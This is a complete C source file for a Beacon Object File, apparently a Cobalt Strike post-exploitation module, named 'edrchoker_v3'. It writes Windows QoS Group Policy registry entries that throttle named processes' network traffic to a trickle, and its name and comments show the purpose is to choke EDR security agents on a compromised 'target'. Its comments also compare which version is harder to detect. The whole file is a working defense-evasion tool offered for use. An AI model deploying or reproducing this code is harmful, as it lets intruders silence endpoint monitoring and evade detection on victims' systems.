/*
 * edrchoker_v3.bof.c — Beacon Object File
 *
 * v3: No WMI, no COM. Pure registry via ADVAPI32.
 * Writes Group Policy QoS entries to:
 *   HKLM\SOFTWARE\Policies\Microsoft\Windows\QoS\<name>
 *
 * pacer.sys reads this key on boot and on Group Policy refresh.
 * Policy is NOT immediately active — activate via:
 *   shell gpupdate /force
 *   OR reboot the target
 *   OR: shell net stop NetQosSvc & net start NetQosSvc
 *
 * v2 (WMI) vs v3 (registry):
 *   v2: immediate effect, uses COM/WMI (detectable via WMI provider events)
 *   v3: requires reboot/gpupdate, no COM/WMI (only ADVAPI32 registry writes)
 *
 * MODES
 *   add        — write policy entries to registry
 *   remove     — delete policies matching given process list
 *   remove_all — delete all QoS policies under the QoS key
 *   list       — enumerate policies
 *
 * COMPILE AS C, NOT C++
 *   mingw64: x86_64-w64-mingw32-gcc -O2 -o edrchoker_v3.x64.o -c edrchoker_v3.bof.c -masm=intel
 *   MSVC:    cl /c /TC /GS- /Foedrchoker_v3.x64.obj edrchoker_v3.bof.c
 */

#ifdef __cplusplus
#error "Compile as C, not C++: use  gcc -c  or  cl /TC"
#endif

#include <windows.h>
#include "beacon.h"

/* ─── Dynamic imports ────────────────────────────────────────────────────── */
DECLSPEC_IMPORT LONG   WINAPI ADVAPI32$RegCreateKeyExW(HKEY, LPCWSTR, DWORD, LPWSTR, DWORD, REGSAM, LPSECURITY_ATTRIBUTES, PHKEY, LPDWORD);
DECLSPEC_IMPORT LONG   WINAPI ADVAPI32$RegOpenKeyExW(HKEY, LPCWSTR, DWORD, REGSAM, PHKEY);
DECLSPEC_IMPORT LONG   WINAPI ADVAPI32$RegSetValueExW(HKEY, LPCWSTR, DWORD, DWORD, const BYTE*, DWORD);
DECLSPEC_IMPORT LONG   WINAPI ADVAPI32$RegQueryValueExW(HKEY, LPCWSTR, LPDWORD, LPDWORD, LPBYTE, LPDWORD);
DECLSPEC_IMPORT LONG   WINAPI ADVAPI32$RegDeleteKeyW(HKEY, LPCWSTR);
DECLSPEC_IMPORT LONG   WINAPI ADVAPI32$RegEnumKeyExW(HKEY, DWORD, LPWSTR, LPDWORD, LPDWORD, LPWSTR, LPDWORD, PFILETIME);
DECLSPEC_IMPORT LONG   WINAPI ADVAPI32$RegCloseKey(HKEY);

DECLSPEC_IMPORT DWORD  WINAPI KERNEL32$GetTickCount(void);
DECLSPEC_IMPORT LPVOID WINAPI KERNEL32$VirtualAlloc(LPVOID, SIZE_T, DWORD, DWORD);
DECLSPEC_IMPORT BOOL   WINAPI KERNEL32$VirtualFree(LPVOID, SIZE_T, DWORD);
DECLSPEC_IMPORT void*  WINAPI KERNEL32$RtlMoveMemory(void*, const void*, SIZE_T);

/* ─── Constants ──────────────────────────────────────────────────────────── */
static const wchar_t g_QosBase[] =
    L"SOFTWARE\\Policies\\Microsoft\\Windows\\QoS\\";

static DWORD g_randS = 0;

/* ─── String helpers ─────────────────────────────────────────────────────── */

static wchar_t* WNextTok(wchar_t** c) {
    wchar_t* s = *c;
    if (!s || !*s) return NULL;
    while (*s == L';') s++;
    if (!*s) { *c = s; return NULL; }
    wchar_t* p = s;
    while (*p && *p != L';') p++;
    if (*p == L';') { *p = L'\0'; *c = p + 1; } else { *c = p; }
    return s;
}

static int WAppend(wchar_t* dst, int pos, int max, const wchar_t* src) {
    while (*src && pos < max - 1) dst[pos++] = *src++;
    return pos;
}

/* Check if needle is one of the semicolon-separated tokens in list */
static BOOL InList(const wchar_t* list, const wchar_t* needle) {
    const wchar_t* p = list;
    while (*p) {
        while (*p == L';') p++;
        if (!*p) break;
        const wchar_t* start = p;
        while (*p && *p != L';') p++;
        int segLen = (int)(p - start);
        int nLen = 0; while (needle[nLen]) nLen++;
        if (segLen == nLen) {
            int eq = 1;
            for (int i = 0; i < segLen; i++) {
                if (start[i] != needle[i]) { eq = 0; break; }
            }
            if (eq) return TRUE;
        }
    }
    return FALSE;
}

static void RandName(wchar_t* out, int n) {
    static const wchar_t pool[] =
        L"abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789";
    if (!g_randS) g_randS = KERNEL32$GetTickCount() | 1;
    for (int i = 0; i < n; i++) {
        g_randS = g_randS * 1664525u + 1013904223u;
        out[i] = pool[(g_randS >> 16) % 62];
    }
    out[n] = L'\0';
}

/* ─── Registry helpers ───────────────────────────────────────────────────── */

static BOOL SetRegStr(HKEY hKey, const wchar_t* name, const wchar_t* val) {
    int len = 0; while (val[len]) len++;
    DWORD sz = (DWORD)((len + 1) * sizeof(wchar_t));
    return ADVAPI32$RegSetValueExW(hKey, name, 0, REG_SZ,
        (const BYTE*)val, sz) == ERROR_SUCCESS;
}

/* ─── QoS policy operations ──────────────────────────────────────────────── */

static BOOL CreateQosPolicy(const wchar_t* proc) {
    wchar_t name[9]; RandName(name, 8);

    /* Build full subkey path: base + random name */
    wchar_t path[128];
    int p = WAppend(path, 0, 128, g_QosBase);
    p = WAppend(path, p, 128, name);
    path[p] = L'\0';

    HKEY hKey = NULL;
    DWORD disp;
    LONG rc = ADVAPI32$RegCreateKeyExW(
        HKEY_LOCAL_MACHINE, path, 0, NULL,
        REG_OPTION_NON_VOLATILE, KEY_SET_VALUE, NULL, &hKey, &disp);
    if (rc != ERROR_SUCCESS || !hKey) {
        BeaconPrintf(CALLBACK_ERROR,
            "  [-] %S: RegCreateKeyEx failed (%ld)\n", proc, rc);
        return FALSE;
    }

    BOOL ok = TRUE;
    ok &= SetRegStr(hKey, L"Version",          L"1.0");
    ok &= SetRegStr(hKey, L"Protocol",         L"TCP");
    ok &= SetRegStr(hKey, L"Application Name", proc);
    ok &= SetRegStr(hKey, L"Local Port",       L"*");
    ok &= SetRegStr(hKey, L"Local IP",         L"*");
    ok &= SetRegStr(hKey, L"Remote Port",      L"*");
    ok &= SetRegStr(hKey, L"Remote IP",        L"*");
    ok &= SetRegStr(hKey, L"DSCP Value",       L"*");
    ok &= SetRegStr(hKey, L"Throttle Rate",    L"8");

    ADVAPI32$RegCloseKey(hKey);

    if (ok) {
        BeaconPrintf(CALLBACK_OUTPUT, "  [+] %S -> '%S'\n", proc, name);
    } else {
        BeaconPrintf(CALLBACK_ERROR,
            "  [-] %S: RegSetValueEx failed\n", proc);
    }
    return ok;
}

/*
 * Delete QoS policies from registry.
 * matchList != NULL: only delete policies whose "Application Name" is in the list.
 * matchList == NULL: delete all policies under the QoS key.
 * Returns number of policies deleted.
 */
static int DeleteQosPolicies(const wchar_t* matchList) {
    HKEY hParent = NULL;
    LONG rc = ADVAPI32$RegOpenKeyExW(HKEY_LOCAL_MACHINE,
        L"SOFTWARE\\Policies\\Microsoft\\Windows\\QoS",
        0, KEY_ENUMERATE_SUB_KEYS | KEY_QUERY_VALUE, &hParent);
    if (rc != ERROR_SUCCESS) {
        BeaconPrintf(CALLBACK_ERROR, "  [-] QoS registry key not found\n");
        return 0;
    }

    /* Collect all subkey names first (up to 64), then delete */
    const int MAX_KEYS = 64;
    const int NAME_LEN = 256;
    wchar_t* namesBuf = (wchar_t*)KERNEL32$VirtualAlloc(
        NULL, (SIZE_T)(MAX_KEYS * NAME_LEN * sizeof(wchar_t)),
        MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (!namesBuf) {
        ADVAPI32$RegCloseKey(hParent);
        return 0;
    }

    int nNames = 0;
    for (DWORD idx = 0; nNames < MAX_KEYS; idx++) {
        DWORD subLen = NAME_LEN;
        if (ADVAPI32$RegEnumKeyExW(hParent, idx, namesBuf + nNames * NAME_LEN,
            &subLen, NULL, NULL, NULL, NULL) != ERROR_SUCCESS)
            break;
        nNames++;
    }

    int n = 0;
    for (int i = 0; i < nNames; i++) {
        wchar_t* sub = namesBuf + i * NAME_LEN;

        /* Read "Application Name" for matching and output */
        wchar_t appName[128];
        BOOL hasApp = FALSE;
        HKEY hSub = NULL;
        if (ADVAPI32$RegOpenKeyExW(hParent, sub, 0, KEY_QUERY_VALUE, &hSub) == ERROR_SUCCESS) {
            DWORD appLen = (DWORD)sizeof(appName);
            DWORD type = 0;
            if (ADVAPI32$RegQueryValueExW(hSub, L"Application Name", NULL, &type,
                (LPBYTE)appName, &appLen) == ERROR_SUCCESS && type == REG_SZ)
                hasApp = TRUE;
            ADVAPI32$RegCloseKey(hSub);
        }

        /* Skip if matchList given and this policy's app is not in list */
        if (matchList != NULL) {
            if (!hasApp || !InList(matchList, appName))
                continue;
        }

        if (ADVAPI32$RegDeleteKeyW(hParent, sub) == ERROR_SUCCESS) {
            if (hasApp) {
                BeaconPrintf(CALLBACK_OUTPUT, "  [+] restored: %S\n", appName);
            }
            n++;
        }
    }

    KERNEL32$VirtualFree(namesBuf, 0, MEM_RELEASE);
    ADVAPI32$RegCloseKey(hParent);
    return n;
}

static void ListQosPolicies(void) {
    HKEY hParent = NULL;
    LONG rc = ADVAPI32$RegOpenKeyExW(HKEY_LOCAL_MACHINE,
        L"SOFTWARE\\Policies\\Microsoft\\Windows\\QoS",
        0, KEY_ENUMERATE_SUB_KEYS | KEY_QUERY_VALUE, &hParent);
    if (rc != ERROR_SUCCESS) {
        BeaconPrintf(CALLBACK_OUTPUT, "  [qos] no policies (key not found)\n");
        BeaconPrintf(CALLBACK_OUTPUT, "[edrchoker_v3] 0 QoS policy(s)\n");
        return;
    }

    int n = 0;
    for (DWORD idx = 0; ; idx++) {
        wchar_t sub[256];
        DWORD subLen = 256;
        if (ADVAPI32$RegEnumKeyExW(hParent, idx, sub, &subLen,
            NULL, NULL, NULL, NULL) != ERROR_SUCCESS)
            break;

        wchar_t appName[128];
        const wchar_t* sApp = L"?";
        HKEY hSub = NULL;
        if (ADVAPI32$RegOpenKeyExW(hParent, sub, 0, KEY_QUERY_VALUE, &hSub) == ERROR_SUCCESS) {
            DWORD appLen = (DWORD)sizeof(appName);
            DWORD type = 0;
            if (ADVAPI32$RegQueryValueExW(hSub, L"Application Name", NULL, &type,
                (LPBYTE)appName, &appLen) == ERROR_SUCCESS && type == REG_SZ)
                sApp = appName;
            ADVAPI32$RegCloseKey(hSub);
        }
        BeaconPrintf(CALLBACK_OUTPUT,
            "  [qos] %S  name='%S'\n", sApp, sub);
        n++;
    }
    ADVAPI32$RegCloseKey(hParent);

    if (n == 0) {
        BeaconPrintf(CALLBACK_OUTPUT, "  [qos] no policies found\n");
    }
    BeaconPrintf(CALLBACK_OUTPUT, "[edrchoker_v3] %d QoS policy(s)\n", n);
}

/* ─── Entry point ────────────────────────────────────────────────────────── */
/*
 * Args packed by CNA:  bof_pack($bid, "zz", cmd, process_list)
 *
 * "add"        → mode 0: write registry QoS policy entries
 * "remove"     → mode 1: remove policies for listed processes
 * "remove_all" → mode 2: remove all QoS policies
 * "list"       → mode 3: enumerate policies
 */
void go(char* args, int len) {
    datap parser;
    BeaconDataParse(&parser, args, len);

    int   cmdN = 0;
    char* cmdA = BeaconDataExtract(&parser, &cmdN);
    int   argN = 0;
    char* argA = BeaconDataExtract(&parser, &argN);

    wchar_t cmd[32];
    int ci = 0;
    if (cmdA) {
        for (; ci < 31 && cmdA[ci]; ci++)
            cmd[ci] = (wchar_t)(unsigned char)cmdA[ci];
    }
    cmd[ci] = L'\0';

    /* "add"        → 0  "remove" → 1
     * "remove_all" → 2  "list"   → 3  */
    LONG mode = 0;
    if (cmd[0] == L'r' && cmd[6] == L'\0') mode = 1;
    if (cmd[0] == L'r' && cmd[6] == L'_')  mode = 2;
    if (cmd[0] == L'l')                     mode = 3;

    const int PLEN = 2048;
    wchar_t* buf = (wchar_t*)KERNEL32$VirtualAlloc(
        NULL, (SIZE_T)PLEN * sizeof(wchar_t),
        MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (!buf) {
        BeaconPrintf(CALLBACK_ERROR, "[-] edrchoker_v3: alloc failed\n");
        return;
    }
    if (argA && argN > 1) {
        int n = argN - 1;
        if (n >= PLEN) n = PLEN - 1;
        for (int i = 0; i < n; i++)
            buf[i] = (wchar_t)(unsigned char)argA[i];
    }

    /* ── MODE 0: write registry entries ─────────────────────────────────── */
    if (mode == 0) {
        if (!buf[0]) {
            BeaconPrintf(CALLBACK_ERROR,
                "[-] usage: edrchoker_v3 add \"proc1.exe;proc2.exe\"\n");
            goto cleanup;
        }

        wchar_t* tb = (wchar_t*)KERNEL32$VirtualAlloc(
            NULL, (SIZE_T)PLEN * sizeof(wchar_t),
            MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
        int ok = 0, fail = 0;
        if (tb) {
            KERNEL32$RtlMoveMemory(tb, buf, (SIZE_T)(PLEN - 1) * sizeof(wchar_t));
            wchar_t* c = tb; wchar_t* tok;
            while ((tok = WNextTok(&c)) != NULL) {
                if (CreateQosPolicy(tok)) { ok++; } else { fail++; }
            }
            KERNEL32$VirtualFree(tb, 0, MEM_RELEASE);
        }
        int cbT;
        if (ok > 0) { cbT = CALLBACK_OUTPUT; } else { cbT = CALLBACK_ERROR; }
        BeaconPrintf(cbT, "[edrchoker_v3] %d policy(s) created, %d failed\n", ok, fail);
        if (ok > 0) {
            BeaconPrintf(CALLBACK_OUTPUT,
                "[!] Activate: shell gpupdate /force  OR  reboot\n");
        }

    /* ── MODE 1: remove specific ─────────────────────────────────────────── */
    } else if (mode == 1) {
        if (!buf[0]) {
            BeaconPrintf(CALLBACK_ERROR,
                "[-] usage: edrchoker_v3 remove \"proc.exe\"\n");
            goto cleanup;
        }
        int n = DeleteQosPolicies(buf);
        int cbT;
        if (n > 0) { cbT = CALLBACK_OUTPUT; } else { cbT = CALLBACK_ERROR; }
        BeaconPrintf(cbT, "[edrchoker_v3] %d policy(s) removed\n", n);

    /* ── MODE 2: remove all ──────────────────────────────────────────────── */
    } else if (mode == 2) {
        int n = DeleteQosPolicies(NULL);
        BeaconPrintf(CALLBACK_OUTPUT,
            "[edrchoker_v3] %d QoS policy(s) removed\n", n);

    /* ── MODE 3: list ────────────────────────────────────────────────────── */
    } else {
        ListQosPolicies();
    }

cleanup:
    KERNEL32$VirtualFree(buf, 0, MEM_RELEASE);
}
